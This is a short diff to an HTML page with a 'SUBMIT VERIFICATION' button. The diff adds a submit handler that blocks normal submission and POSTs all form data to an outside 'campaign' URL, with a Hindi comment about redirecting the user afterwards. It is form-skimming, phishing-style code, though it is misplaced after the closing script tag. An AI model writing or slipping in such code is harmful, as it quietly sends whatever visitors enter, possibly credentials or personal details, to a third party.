@@ -272,7 +272,20 @@
       submitBtn.innerText = 'SUBMIT VERIFICATION';
     }
   });
-</script>
+</script> document.querySelector('form').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const formData = new FormData(this);
+  try {
+    await fetch('https://offer.pathakcpa.in/campaign/6f4hq3', {
+      method: 'POST',
+      body: formData
+    });
+  } catch (error) {
+    console.error('Tracking failed', error);
+  }
+  // यहाँ से आप यूज़र को रीडायरेक्ट कर सकते हैं
+});
+  
 
 </body>
 </html>
